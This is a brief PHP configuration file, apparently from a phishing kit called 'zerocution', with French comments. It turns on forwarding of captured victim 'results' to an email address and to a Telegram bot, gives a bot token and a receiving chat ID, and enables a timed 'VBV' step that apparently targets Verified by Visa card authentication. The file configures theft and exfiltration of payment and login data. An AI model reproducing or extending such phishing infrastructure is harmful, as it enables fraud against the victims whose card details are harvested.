<?php

#zerocution

# Mail
$mail_send = true;                                           # False pour ne pas recevoir par Mail
$rezmail = "email@email.com";

#Telegram
$tlg_send = true;                                       # False pour ne pas recevoir par Telegram
$bot_token = "7720175856:AAGci3JHxpt0VL6VLWz9rTB0b087o1wT8Lg";

$rez_chat = "-4623033481";                                 # Channel de réception des informations

# VBV

$vbv = true;
$timeVBV = "15";

# DEV

$test_mode = false;

?>